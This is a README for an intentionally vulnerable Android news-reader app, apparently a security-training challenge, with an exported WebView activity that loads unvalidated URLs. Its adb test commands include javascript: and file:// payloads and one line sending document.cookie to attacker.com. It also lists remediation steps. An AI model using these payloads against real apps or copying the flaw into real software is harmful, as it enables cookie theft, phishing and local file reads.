# oxo-android-ben18 News Reader App

## Challenge Details

### Description

This Android app sample demonstrates a news reader application with a critical WebView malicious URL vulnerability:

- The app provides a comprehensive news reading experience with multiple sections including article viewing, user profiles, settings, and premium content.
- The vulnerability exists in the `ArticleViewerActivity` which is exported and accepts URLs from external sources without proper validation.
- Any third-party app can launch this activity and load arbitrary URLs, including malicious sites, JavaScript payloads, or local files.
- The WebView component has JavaScript enabled and file access permissions, making it susceptible to various web-based attacks.
- This creates opportunities for phishing attacks, cross-site scripting (XSS), data exfiltration, and unauthorized access to local device resources.

The app showcases a realistic mobile news application that appears legitimate while containing a severe security flaw in URL handling.

### Vulnerability Type and Category

- **Type:** WebView Malicious URL Loading / Exported Activity Vulnerability
- **Category:** Improper Input Validation, Insecure WebView Configuration, Intent-based Security Bypass

### Attack Vector: Exported Activity with Direct URL Loading

This vulnerability occurs when an Android activity with `android:exported="true"` directly loads URLs from intent extras without validation. The specific attack characteristics include:

#### Key Vulnerability Components:
- **Exported Activity**: `ArticleViewerActivity` is marked as exported and accessible by external applications
- **Intent Filter**: Activity accepts `android.intent.action.VIEW` with browsable category
- **Direct URL Loading**: WebView directly loads URLs from `getStringExtra("url")` without validation
- **No Security Checks**: No allowlist, domain validation, or URL sanitization
- **Dangerous WebView Settings**: JavaScript enabled, file access enabled, DOM storage enabled

#### Exploitation Methods:
1. **Malicious Website Loading**: Load phishing sites or malware distribution pages
2. **JavaScript Injection**: Execute malicious JavaScript via `javascript:` URLs
3. **Local File Access**: Potentially read local files using `file://` protocol
4. **Phishing Attacks**: Display fake login pages with convincing titles
5. **Cross-Site Scripting**: Inject scripts that can access app context and data

### Difficulty

Medium

## Testing the Vulnerability

### Prerequisites
- Android device or emulator with the app installed
- ADB (Android Debug Bridge) installed and device connected

### Vulnerability Test Commands

#### Basic Malicious URL Test
```bash
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "http://google.com"
```

#### Phishing Attack Simulation
```bash
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "http://fake-banking-site.com" -e article_title "Important Security Update"
```

#### JavaScript Injection Test
```bash
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "javascript:alert('XSS Vulnerability Confirmed')"
```

#### Local File Access Test
```bash
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "file:///system/etc/hosts"
```

#### Data Exfiltration Simulation
```bash
adb shell am start -n co.ostorlab.myapplication/.ArticleViewerActivity -e url "javascript:location.href='http://attacker.com/steal?data='+document.cookie"
```

### Expected Behavior
- The app should launch the ArticleViewerActivity without any validation
- Malicious URLs should load directly in the WebView component
- JavaScript payloads should execute within the app context
- No security warnings or URL validation should occur
- The vulnerability allows complete bypass of the app's intended URL restrictions

### Remediation
To fix this vulnerability:
1. Add URL validation and allowlisting for trusted domains
2. Disable JavaScript in WebView unless absolutely necessary
3. Restrict file access permissions
4. Validate and sanitize all intent parameters
5. Consider making the activity non-exported if external access isn't required

## Build Instructions

This sample project uses Android Studio with Kotlin and AndroidX libraries.

- Open the project in Android Studio.
- Update your SDK versions as required (compileSdkVersion >= 31 recommended).
- Ensure all dependencies are properly configured in the Gradle files.
- Build and deploy the app on an emulator or an Android device.
- The app will launch with the main news feed and allow navigation between different sections.
- Use the ADB commands above to test the vulnerability.
